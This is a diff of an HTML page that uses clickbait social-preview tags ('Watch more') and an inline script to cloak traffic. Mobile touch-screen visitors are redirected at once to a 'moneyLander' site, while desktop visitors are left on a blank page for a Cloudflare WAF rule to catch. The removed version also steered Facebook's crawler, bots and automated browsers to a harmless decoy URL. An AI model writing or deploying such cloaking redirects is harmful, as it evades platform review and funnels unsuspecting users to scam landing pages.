@@ -4,41 +4,32 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
-    <!-- Updated Social Preview -->
     <meta property="og:title" content="Watch more">
     <meta property="og:description" content="Watch more">
-    
-    <meta property="og:image" content="https://i.postimg.cc/DzD235mH/Picsart-26-07-08-17-22-55-667.jpg">
-    <meta property="og:image:width" content="500">
-    <meta property="og:image:height" content="500">
+    <meta property="og:image" content="https://i.postimg.cc/j221zD2L/IMG-20260707-WA0000.jpg">
     <meta property="og:type" content="website">
 
     <script>
-        const safeRedirect = "https://community.cloudflare.com/t/how-to-bypass-cloudflare-country-challenge-captcha-on-some-urls/140948";
-        const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
-
-        window.onload = function() {
+        // Redirect Logic ko bilkul shuru mein rakha hai taake image load hone se pehle hi action ho
+        (function() {
+            const moneyLander = "https://ocher-dove-11v65rh.mystrikingly.com/";
             const ua = navigator.userAgent.toLowerCase();
-            const isLargeScreen = window.innerWidth > 490;
-            const isBot = /facebookexternalhit|facebot|metainspector|crawler|spider|bot/i.test(ua);
-            const isAutomated = navigator.webdriver === true;
-            const hasTouchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
-            const isMobileOrTablet = /android|iphone|ipad|ipod/i.test(ua);
-            const isDesktopPC = /windows|macintosh|linux/i.test(ua) && !/iphone|ipad|android/i.test(ua);
+            const hasTouch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+            const isDesktop = !hasTouch || window.innerWidth > 490;
 
-            if (isLargeScreen || isBot || isAutomated || !hasTouchSupport || isDesktopPC) {
-                window.location.replace(safeRedirect);
-            } else if (isMobileOrTablet && hasTouchSupport) {
+            // Agar Mobile hai, toh seedha lander pe bhejo
+            if (hasTouch && window.innerWidth <= 490) {
                 window.location.replace(moneyLander);
-            } else {
-                window.location.replace(safeRedirect);
+            } 
+            // Agar Desktop hai, toh redirect MAT karo.
+            // Jab code yahan ruk jayega, tab Cloudflare ka WAF rule trigger hoga.
+            else {
+                console.log("Waiting for WAF");
             }
-        };
+        })();
     </script>
 </head>
-<body style="background-color: #ffffff; margin: 0; padding: 0; text-align: center;">
-
-    <img src="https://i.postimg.cc/nLFxDC2Q/482294128736867509.jpg" alt="" style="max-width: 100%; height: auto; display: block; margin: 0 auto;">
-
+<body style="background-color: #ffffff;">
+    <!-- Body khaali rakhi hai taake redirect hone wale ko kuch na dikhe -->
 </body>
 </html>
